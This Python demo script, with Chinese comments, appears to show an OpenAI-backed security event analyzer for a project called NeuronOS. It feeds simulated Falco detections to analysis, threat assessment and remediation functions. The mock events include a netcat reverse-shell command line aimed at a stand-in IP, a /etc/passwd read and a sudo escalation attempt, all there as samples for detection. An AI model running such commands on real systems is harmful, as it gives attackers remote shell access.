#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OpenAI API集成演示脚本
展示如何使用NeuronOS的OpenAI分析功能
"""

import asyncio
import json
import sys
from datetime import datetime
from pathlib import Path

# 添加项目路径
sys.path.append(str(Path(__file__).parent.parent / "src" / "backend"))

from services.openai_service import (
    OpenAIService,
    AnalysisRequest,
    AnalysisType,
    Priority,
    analyze_events,
    get_remediation_advice,
    assess_threat
)

from config.openai_config import (
    OpenAIConfig,
    AnalysisComplexity,
    get_template_config,
    get_analysis_config
)


def print_separator(title: str):
    """打印分隔符"""
    print("\n" + "=" * 60)
    print(f" {title} ")
    print("=" * 60)


def print_analysis_result(response, title: str):
    """打印分析结果"""
    print_separator(title)
    print(f"请求ID: {response.request_id}")
    print(f"分析类型: {response.analysis_type.value}")
    print(f"优先级: {response.priority.value}")
    print(f"风险评分: {response.risk_score}/100")
    print(f"置信度: {response.confidence:.2%}")
    print(f"处理时间: {response.processing_time:.2f}秒")
    
    if response.token_usage:
        print(f"Token使用: {response.token_usage.get('total_tokens', 'N/A')}")
    
    print(f"\n摘要:\n{response.summary}")
    print(f"\n详细分析:\n{response.detailed_analysis}")
    
    if response.recommendations:
        print("\n建议:")
        for i, rec in enumerate(response.recommendations, 1):
            print(f"  {i}. {rec}")
    
    if response.affected_systems:
        print(f"\n受影响系统: {', '.join(response.affected_systems)}")
    
    if response.attack_vectors:
        print(f"\n攻击向量: {', '.join(response.attack_vectors)}")
    
    if response.mitigation_steps:
        print("\n缓解步骤:")
        for i, step in enumerate(response.mitigation_steps, 1):
            print(f"  {i}. {step}")


async def demo_basic_analysis():
    """演示基础安全分析"""
    print_separator("基础安全分析演示")
    
    # 模拟安全事件数据
    events = [
        {
            "event_id": "evt_001",
            "timestamp": "2024-01-15T10:30:00Z",
            "rule": "Suspicious File Access",
            "message": "Unauthorized access to /etc/passwd detected",
            "priority": "Warning",
            "source": "falco",
            "process": {
                "name": "cat",
                "pid": 12345,
                "user": "unknown_user"
            },
            "file": {
                "path": "/etc/passwd",
                "permission": "read"
            },
            "host": "web-server-01"
        },
        {
            "event_id": "evt_002",
            "timestamp": "2024-01-15T10:31:00Z",
            "rule": "Network Connection to Suspicious IP",
            "message": "Outbound connection to known malicious IP 192.168.1.100",
            "priority": "Critical",
            "source": "falco",
            "process": {
                "name": "wget",
                "pid": 12346,
                "user": "unknown_user"
            },
            "network": {
                "dest_ip": "192.168.1.100",
                "dest_port": 443,
                "protocol": "tcp"
            },
            "host": "web-server-01"
        }
    ]
    
    try:
        # 使用便捷函数进行分析
        result = await analyze_events(events, AnalysisType.SECURITY_ANALYSIS)
        print_analysis_result(result, "安全分析结果")
        
    except Exception as e:
        print(f"分析失败: {e}")


async def demo_threat_assessment():
    """演示威胁评估"""
    print_separator("威胁评估演示")
    
    # 模拟高风险事件
    threat_events = [
        {
            "event_id": "threat_001",
            "timestamp": "2024-01-15T11:00:00Z",
            "rule": "Privilege Escalation Attempt",
            "message": "Attempt to execute sudo with suspicious parameters",
            "priority": "Critical",
            "source": "falco",
            "process": {
                "name": "sudo",
                "pid": 15678,
                "user": "attacker",
                "cmdline": "sudo -u root /bin/bash -c 'echo vulnerable'"
            },
            "host": "database-server"
        },
        {
            "event_id": "threat_002",
            "timestamp": "2024-01-15T11:01:00Z",
            "rule": "Reverse Shell Detection",
            "message": "Potential reverse shell connection detected",
            "priority": "Critical",
            "source": "falco",
            "process": {
                "name": "nc",
                "pid": 15679,
                "user": "attacker",
                "cmdline": "nc -e /bin/bash 192.168.1.100 4444"
            },
            "network": {
                "dest_ip": "192.168.1.100",
                "dest_port": 4444,
                "protocol": "tcp"
            },
            "host": "database-server"
        }
    ]
    
    try:
        # 威胁评估
        result = await assess_threat(threat_events)
        print_analysis_result(result, "威胁评估结果")
        
    except Exception as e:
        print(f"威胁评估失败: {e}")


async def demo_remediation_advice():
    """演示修复建议"""
    print_separator("修复建议演示")
    
    # 模拟需要修复的安全事件
    incident_events = [
        {
            "event_id": "incident_001",
            "timestamp": "2024-01-15T12:00:00Z",
            "rule": "Malware Detection",
            "message": "Suspicious binary execution detected",
            "priority": "Critical",
            "source": "falco",
            "process": {
                "name": "malware.exe",
                "pid": 20001,
                "user": "compromised_user",
                "path": "/tmp/malware.exe"
            },
            "file": {
                "path": "/tmp/malware.exe",
                "hash": "d41d8cd98f00b204e9800998ecf8427e",
                "size": 1024000
            },
            "host": "workstation-05"
        }
    ]
    
    try:
        # 获取修复建议
        result = await get_remediation_advice(incident_events)
        print_analysis_result(result, "修复建议结果")
        
    except Exception as e:
        print(f"获取修复建议失败: {e}")


async def demo_batch_analysis():
    """演示批量分析"""
    print_separator("批量分析演示")
    
    # 创建OpenAI服务实例
    try:
        service = OpenAIService()
        
        # 准备多个分析请求
        requests = [
            AnalysisRequest(
                analysis_type=AnalysisType.SECURITY_ANALYSIS,
                events=[{
                    "event_id": "batch_001",
                    "rule": "File Permission Change",
                    "message": "Suspicious chmod operation"
                }],
                priority=Priority.MEDIUM
            ),
            AnalysisRequest(
                analysis_type=AnalysisType.PATTERN_ANALYSIS,
                events=[{
                    "event_id": "batch_002",
                    "rule": "Repeated Login Failures",
                    "message": "Multiple failed login attempts"
                }],
                priority=Priority.HIGH
            )
        ]
        
        print(f"开始批量分析 {len(requests)} 个请求...")
        
        # 并发执行分析
        tasks = [service.analyze_security_events(req) for req in requests]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # 处理结果
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                print(f"\n请求 {i+1} 失败: {result}")
            else:
                print_analysis_result(result, f"批量分析结果 {i+1}")
        
        # 显示统计信息
        stats = service.get_statistics()
        print_separator("服务统计信息")
        for key, value in stats.items():
            print(f"{key}: {value}")
        
    except Exception as e:
        print(f"批量分析失败: {e}")


async def demo_configuration():
    """演示配置管理"""
    print_separator("配置管理演示")
    
    # 显示OpenAI配置
    config = OpenAIConfig()
    print("OpenAI配置:")
    config_dict = config.to_dict()
    print(json.dumps(config_dict, indent=2, ensure_ascii=False))
    
    # 显示分析类型配置
    print("\n分析类型配置:")
    for analysis_type in AnalysisType:
        analysis_config = get_analysis_config(analysis_type.value)
        template_config = get_template_config(analysis_type.value)
        
        print(f"\n{analysis_type.value}:")
        print(f"  优先级: {analysis_config['priority']}")
        print(f"  超时: {analysis_config['timeout']}秒")
        print(f"  缓存TTL: {analysis_config['cache_ttl']}秒")
        print(f"  最大事件数: {analysis_config['max_events']}")
        print(f"  期望字段: {', '.join(template_config['expected_fields'])}")
    
    # 显示模型配置
    print("\n模型配置:")
    for complexity in AnalysisComplexity:
        model_config = config.get_model_config(complexity)
        print(f"  {complexity.value}: {model_config.model_type.value} (max_tokens: {model_config.max_tokens})")


async def demo_error_handling():
    """演示错误处理"""
    print_separator("错误处理演示")
    
    try:
        # 测试无效事件数据
        invalid_events = []
        result = await analyze_events(invalid_events, AnalysisType.SECURITY_ANALYSIS)
        print("空事件列表处理成功")
        
    except Exception as e:
        print(f"空事件列表处理失败: {e}")
    
    try:
        # 测试无效分析类型（这里我们模拟一个边界情况）
        events = [{"test": "data"}]
        
        # 创建一个包含大量事件的请求（测试限制）
        large_events = [{"event_id": f"large_{i}", "data": "test"} for i in range(1000)]
        result = await analyze_events(large_events, AnalysisType.SECURITY_ANALYSIS)
        print("大量事件处理成功")
        
    except Exception as e:
        print(f"大量事件处理: {e}")


async def main():
    """主演示函数"""
    print("NeuronOS OpenAI API集成演示")
    print("=" * 60)
    print("本演示将展示以下功能:")
    print("1. 基础安全分析")
    print("2. 威胁评估")
    print("3. 修复建议")
    print("4. 批量分析")
    print("5. 配置管理")
    print("6. 错误处理")
    print("\n注意: 需要配置有效的OpenAI API密钥才能运行实际分析")
    
    # 检查配置
    try:
        from core.config import settings
        if not settings.openai_api_key or settings.openai_api_key == "your-openai-api-key-here":
            print("\n⚠️  警告: 未配置有效的OpenAI API密钥")
            print("请在环境变量中设置 OPENAI_API_KEY 或更新配置文件")
            print("演示将使用模拟数据继续运行...\n")
    except Exception as e:
        print(f"\n配置检查失败: {e}\n")
    
    # 运行演示
    demos = [
        ("基础安全分析", demo_basic_analysis),
        ("威胁评估", demo_threat_assessment),
        ("修复建议", demo_remediation_advice),
        ("批量分析", demo_batch_analysis),
        ("配置管理", demo_configuration),
        ("错误处理", demo_error_handling)
    ]
    
    for name, demo_func in demos:
        try:
            print(f"\n🚀 开始演示: {name}")
            await demo_func()
            print(f"✅ {name} 演示完成")
        except Exception as e:
            print(f"❌ {name} 演示失败: {e}")
        
        # 等待用户确认继续
        input("\n按回车键继续下一个演示...")
    
    print_separator("演示完成")
    print("感谢使用NeuronOS OpenAI API集成功能！")
    print("\n更多信息请参考:")
    print("- API文档: http://localhost:8000/docs")
    print("- 项目文档: /docs/1.4.1 OpenAI API集成.md")
    print("- 测试文件: /tests/test_1_4_1_openai_integration.py")


if __name__ == "__main__":
    # 运行演示
    asyncio.run(main())